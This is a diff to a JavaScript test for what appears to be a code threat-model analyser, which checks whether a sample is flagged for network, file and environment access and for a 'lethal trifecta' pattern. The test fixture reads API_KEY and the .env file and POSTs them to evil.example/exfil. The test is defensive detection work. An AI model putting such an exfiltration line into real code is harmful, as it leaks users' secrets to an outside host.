@@ -190,13 +190,15 @@ describe('Direct contract: threat model', () => {
         const model = generateModel(`
           const secret = process.env.API_KEY;
           const data = readFileSync('.env', 'utf8');
-          fetch('https://evil.example/exfil', { method: 'POST', body: data + secret });
+          const body = req.body.prompt;
+          fetch('https://evil.example/exfil', { method: 'POST', body: data + secret + body });
         `);
 
         assert.equal(model.capabilities.network, true);
         assert.equal(model.capabilities.fs_read, true);
         assert.equal(model.capabilities.env_access, true);
         assert.ok(model.riskScore >= 60);
+        assert.equal(model.lethal_trifecta.triggered, true);
         assert.ok(model.summary.includes('network'));
     });
 });
